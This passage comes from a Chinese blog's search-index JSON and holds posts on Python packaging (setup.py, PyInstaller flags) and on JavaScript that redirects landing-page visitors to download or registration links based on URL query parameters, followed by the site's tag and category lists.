（名称，版本等）进行安装。 setup.py 文件的示例： 123456789from distutils.core import setupsetup( name='W3Cschool', version='0.1dev', packages=['w3cschool',], license='MIT', long_description=open('README.txt').read(),) 创建 setup.py 文件后，将其上传到 PyPI，或使用命令行创建二进制分发（可执行安装程序）。 要构建源代码发行版，请使用命令行导航到包含 setup.py 的目录，然后运行 python setup.py sdist 命令。 运行 python setup.py bdist，或者对于Windows，使用 python setup.py bdist_wininst 来构建二进制分发。 使用 python setup.py register，然后用 python setup.py sdist upload 来上传一个包。 最后，用 python setup.py install 安装一个软件包。 为用户打包 上一课包含了供其他 Python 程序员使用的打包模块。但是，许多不是程序员的计算机用户没有安装 Python。 因此，将脚本打包为相关平台（如 Windows 或 Mac 操作系统）的可执行文件很有用。 这对于 Linux 来说不是必需的，因为大多数 Linux 用户的确已经安装了Python，并且能够像原来一样运行脚本。 对于 Windows，许多工具可用于将脚本转换为可执行文件。例如，py2exe 可用于将 Python 脚本及其所需的库打包到单个可执行文件中。 PyInstaller 和 cx_Freeze 服务于相同的目的。 Mac 使用 py2app，PyInstaller 或 cx_Freeze。 pyinstaller xxx.py 注：终端需切换至xxx.py文件所在目录下。 常用可选项及说明： -F：打包后只生成单个exe格式文件； -D：默认选项，创建一个目录，包含exe文件以及大量依赖文件； -c：默认选项，使用控制台(就是类似cmd的黑框)； -w：不使用控制台； -p：添加搜索路径，让其找到对应的库； -i：改变生成程序的icon图标。","link":"/2020/08/04/python3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E9%87%8D%E7%82%B9/"},{"title":"配置渠道包html代码修改","text":"一，html获取参数对应不同下载链接 12345678910111213141516171819202122232425262728293031323334353637&lt;/head&gt; &lt;script&gt; const c = getQueryString(&quot;c&quot;); function getQueryString(name) { let reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;, &quot;i&quot;); let r = window.location.search.substr(1).match(reg); if (r != null) { return unescape(r[2]); }; return null; } function ANDDownSoft() { if(c == null) { window.location.href = &quot;下载链接1&quot;; } else if (c == &quot;9PVHH&quot;) { window.location.href = &quot;下载链接2&quot;; } else if (c == &quot;qita&quot;){ window.location.href = &quot;下载链接3&quot;; } else { window.location.href = &quot;下载链接1&quot;; } } function IOSDownSoft() { if(c == null) { window.location.href = &quot;下载链接1&quot;; } else if (c == &quot;9PVHH&quot;) { window.location.href = &quot;下载链接2&quot;; } else{ window.location.href = &quot;下载链接1&quot;; } } &lt;/script&gt; 调用 图片点击下载链接ios的app 123&lt;div class=&quot;btn&quot;&gt; &lt;a onclick=&quot;IOSDownSoft();&quot;&gt;&lt;img src=&quot;static/picture/btn.png&quot; alt=&quot;&quot;&gt;&lt;/a&gt;&lt;/div&gt; h5展示三条 获取参数 跳转 12345678910111213141516171819202122232425262728293031323334 &lt;div class=&quot;tzbox&quot; &gt; &lt;div class=&quot;btn1&quot;&gt; &lt;span class=&quot;zdy&quot;&gt;站点一&lt;/span&gt;&lt;a class=&quot;ym1&quot;&gt;3333.com&lt;/a&gt;&lt;a class=&quot;djjr1&quot; onclick=&quot;zdydownload();&quot; target=&quot;_blank&quot;&gt;点击进入&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;btn2&quot;&gt; &lt;span class=&quot;zde&quot;&gt;站点二&lt;/span&gt;&lt;a class=&quot;ym2&quot;&gt;2222.com&lt;/a&gt;&lt;a class=&quot;djjr2&quot; onclick=&quot;zdedownload();&quot; target=&quot;_blank&quot;&gt;点击进入&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;btn3&quot;&gt; &lt;span class=&quot;zds&quot;&gt;站点三&lt;/span&gt;&lt;a class=&quot;ym3&quot;&gt;1111.com&lt;/a&gt;&lt;a class=&quot;djjr3&quot; onclick=&quot;zdsdownload();&quot; target=&quot;_blank&quot;&gt;点击进入&lt;/a&gt; &lt;/div&gt; &lt;script&gt; function zdydownload(){ var url = 'https://3333.com/register.html' +document.location.search; console.log(url); window.open(url); } function zdedownload(){ var url = 'https://2222.com/register.html' +document.location.search; console.log(url); window.open(url); } function zdsdownload(){ var url = 'https://1111.com/register.html' +document.location.search; console.log(url); window.open(url); } &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; H5点击跳转加参数 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;body&gt; &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt; &lt;ul&gt; &lt;li&gt; &lt;a &quot;https://111&quot; onclick=&quot;zdydownload();&quot; target=&quot;_blank&quot;&gt;&lt;span class=&quot;btn-open&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;span class=&quot;ms&quot;&gt;站点一&lt;/span&gt; &lt;span class=&quot;url&quot;&gt;111/span&gt; &lt;/li&gt; &lt;li&gt; &lt;a &quot;https://345&quot; onclick=&quot;zdedownload();&quot; target=&quot;_blank&quot;&gt;&lt;span class=&quot;btn-open&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;span class=&quot;ms&quot;&gt;站点二&lt;/span&gt; &lt;span class=&quot;url&quot;&gt;345.com&lt;/span&gt; &lt;/li&gt; &lt;li&gt; &lt;a &quot;https://234.com&quot; onclick=&quot;zdsdownload();&quot; target=&quot;_blank&quot;&gt;&lt;span class=&quot;btn-open&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;span class=&quot;ms&quot;&gt;站点三&lt;/span&gt; &lt;span class=&quot;url&quot;&gt;234.com&lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script&gt; function zdydownload(){ var url = 'https://2222:8443/#/auth' +document.location.search; console.log(url); window.open(url); } function zdedownload(){ var url = 'https://11112.com:8443/#/auth' +document.location.search; console.log(url); window.open(url); } function zdsdownload(){ var url = 'https://1111.com:8443/#/auth' +document.location.search; console.log(url); window.open(url); } &lt;/script&gt;&lt;/body&gt; 二，获取当前输入的url？后面的参数，并自动转入新网站的url参数字符串1,判断C的值，跳转只需在&lt;head&gt; &lt;/head&gt;之间加上代码和新的网址 1234567891011121314151617181920212223 &lt;script&gt; const from_gameid = getQueryString(&quot;from_gameid&quot;); const channelCode = getQueryString(&quot;channelCode&quot;); const c = getQueryString(&quot;c&quot;); function getQueryString(name) { let reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;, &quot;i&quot;); let r = window.location.search.substr(1).match(reg); if (r != null) { return unescape(r[2]); }; return null; }function DownSoft() { if(c == null) { window.location.href = &quot;https://www.yichenxiu.com&quot;; } else if (c != null) { window.location.href = &quot;https://www.yichenxiu.com/?c=&quot; + c; } } &lt;/script&gt; 2,判断from_gameid和channelCode的值，跳转1234567891011121314151617181920212223242526&lt;script&gt; const from_gameid = getQueryString(&quot;from_gameid&quot;); const channelCode = getQueryString(&quot;channelCode&quot;); function getQueryString(name) { let reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;, &quot;i&quot;); let r = window.location.search.substr(1).match(reg); if (r != null) { return unescape(r[2]); }; return null; }function DownSoft() { if (from_gameid == null &amp;&amp; channelCode == null) { window.location.href = &quot;https://www.yichenxiu.com&quot;; } else if (from_gameid != null &amp;&amp; channelCode != null) { window.location.href = &quot;https://www.yichenxiu.com/?from_gameid=&quot; + from_gameid + &quot;&amp;channelCode=&quot; + channelCode; } else if (from_gameid != null) { window.location.href = &quot;https://www.yichenxiu.com/?from_gameid=&quot; + from_gameid; } else { window.location.href = &quot;https://www.yichenxiu.com/?channelCode=&quot; + channelCode; } } &lt;/script&gt; 3 获取当前uri?后面的所有参数的值都10秒自动跳转123456789101112131415161718192021222324&lt;html&gt;&lt;head&gt;&lt;title&gt;正在跳转&lt;/title&gt;&lt;meta http-equiv=&quot;Content-Language&quot; content=&quot;zh-CN&quot;&gt;&lt;meta HTTP-EQUIV=&quot;Content-Type&quot; CONTENT=&quot;text/html; charset=gb2312&quot;&gt;//主要代码&lt;script&gt; var argsStr = location.search; var oMeta = document.createElement('meta'); oMeta.httpEquiv = 'refresh'; oMeta.content = '10;url=https://www.yichenxiu.com/'+argsStr; document.getElementsByTagName('head')[0].appendChild(oMeta);&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;display:none&quot;&gt;&lt;script type=&quot;text/javascript&quot;&gt;var cnzz_protocol = ((&quot;https:&quot; == document.location.protocol) ? &quot;https://&quot; : &quot;http://&quot;);document.write(unescape(&quot;%3Cspan id='cnzz_stat_icon_1278199398'%3E%3C/span%3E%3Cscript src='&quot; + cnzz_protocol + &quot;s4.cnzz.com/z_stat.php%3Fid%3D1278199398%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E&quot;));&lt;/script&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;","link":"/2020/08/05/%E6%B8%A0%E9%81%93%E5%8C%85html/"}],"tags":[{"name":"html","slug":"html","link":"/tags/html/"},{"name":"zabbix","slug":"zabbix","link":"/tags/zabbix/"},{"name":"文件系统","slug":"文件系统","link":"/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"name":"web","slug":"web","link":"/tags/web/"},{"name":"English","slug":"English","link":"/tags/English/"},{"name":"科学上网","slug":"科学上网","link":"/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"},{"name":"Prometheus","slug":"Prometheus","link":"/tags/Prometheus/"},{"name":"工具","slug":"工具","link":"/tags/%E5%B7%A5%E5%85%B7/"},{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"数据库","slug":"数据库","link":"/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"docker","slug":"docker","link":"/tags/docker/"},{"name":"rsync","slug":"rsync","link":"/tags/rsync/"},{"name":"自动化","slug":"自动化","link":"/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"redis","slug":"redis","link":"/tags/redis/"},{"name":"work","slug":"work","link":"/tags/work/"},{"name":"日常","slug":"日常","link":"/tags/%E6%97%A5%E5%B8%B8/"},{"name":"windows","slug":"windows","link":"/tags/windows/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"mysql","slug":"mysql","link":"/tags/mysql/"},{"name":"ios","slug":"ios","link":"/tags/ios/"},{"name":"yum","slug":"yum","link":"/tags/yum/"},{"name":"dns","slug":"dns","link":"/tags/dns/"},{"name":"域名","slug":"域名","link":"/tags/%E5%9F%9F%E5%90%8D/"},{"name":"容器","slug":"容器","link":"/tags/%E5%AE%B9%E5%99%A8/"},{"name":"博客","slug":"博客","link":"/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"日志","slug":"日志","link":"/tags/%E6%97%A5%E5%BF%97/"},{"name":"防火墙","slug":"防火墙","link":"/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"网络","slug":"网络","link":"/tags/%E7%BD%91%E7%BB%9C/"},{"name":"ftp","slug":"ftp","link":"/tags/ftp/"},{"name":"elk","slug":"elk","link":"/tags/elk/"},{"name":"git","slug":"git","link":"/tags/git/"},{"name":"高可用","slug":"高可用","link":"/tags/%E9%AB%98%E5%8F%AF%E7%94%A8/"},{"name":"负载均衡","slug":"负载均衡","link":"/tags/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"},{"name":"k8s","slug":"k8s","link":"/tags/k8s/"},{"name":"环境","slug":"环境","link":"/tags/%E7%8E%AF%E5%A2%83/"},{"name":"系统","slug":"系统","link":"/tags/%E7%B3%BB%E7%BB%9F/"},{"name":"shell","slug":"shell","link":"/tags/shell/"},{"name":"磁盘","slug":"磁盘","link":"/tags/%E7%A3%81%E7%9B%98/"},{"name":"nginx","slug":"nginx","link":"/tags/nginx/"},{"name":"ssl","slug":"ssl","link":"/tags/ssl/"},{"name":"sed","slug":"sed","link":"/tags/sed/"},{"name":"tomcat","slug":"tomcat","link":"/tags/tomcat/"},{"name":"Django","slug":"Django","link":"/tags/Django/"},{"name":"Selenlium","slug":"Selenlium","link":"/tags/Selenlium/"},{"name":"vim","slug":"vim","link":"/tags/vim/"},{"name":"lnmp","slug":"lnmp","link":"/tags/lnmp/"},{"name":"工作","slug":"工作","link":"/tags/%E5%B7%A5%E4%BD%9C/"},{"name":"计算机语言","slug":"计算机语言","link":"/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%AD%E8%A8%80/"},{"name":"日志加密","slug":"日志加密","link":"/tags/%E6%97%A5%E5%BF%97%E5%8A%A0%E5%AF%86/"},{"name":"爬虫","slug":"爬虫","link":"/tags/%E7%88%AC%E8%99%AB/"},{"name":"脚本","slug":"脚本","link":"/tags/%E8%84%9A%E6%9C%AC/"},{"name":"正则表达","slug":"正则表达","link":"/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE/"},{"name":"网络编程","slug":"网络编程","link":"/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"},{"name":"fastdfs","slug":"fastdfs","link":"/tags/fastdfs/"},{"name":"Kubernetes","slug":"Kubernetes","link":"/tags/Kubernetes/"}],"categories":[{"name":"HTML","slug":"HTML","link":"/categories/HTML/"},{"name":"linux2","slug":"linux2","link":"/categories/linux2/"},{"name":"linux3","slug":"linux3","link":"/categories/linux3/"},{"name":"English","slug":"English","link":"/categories/English/"},{"name":"worknew","slug":"worknew","link":"/categories/worknew/"},{"name":"绿色上网","slug":"绿色上网","link":"/categories/%E7%BB%BF%E8%89%B2%E4%B8%8A%E7%BD%91/"},{"name":"数据库","slug":"数据库","link":"/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"html","slug":"worknew/html","link":"/categories/worknew/html/"},{"name":"work","slug":"work","link":"/categories/work/"},{"name":"python","slug":"python","link":"/categories/python/"},{"name":"linux1","slug":"linux1","link":"/categories/linux1/"},{"name":"JS","slug":"JS","link":"/categories/JS/"},{"name":"html","slug":"html","link":"/categories/html/"},{"name":"工作","slug":"工作","link":"/categories/%E5%B7%A5%E4%BD%9C/"},{"name":"web","slug":"web","link":"/categories/web/"},{"name":"脚本","slug":"脚本","link":"/categories/%E8%84%9A%E6%9C%AC/"},{"name":"英语","slug":"英语","link":"/categories/%E8%8B%B1%E8%AF%AD/"}]}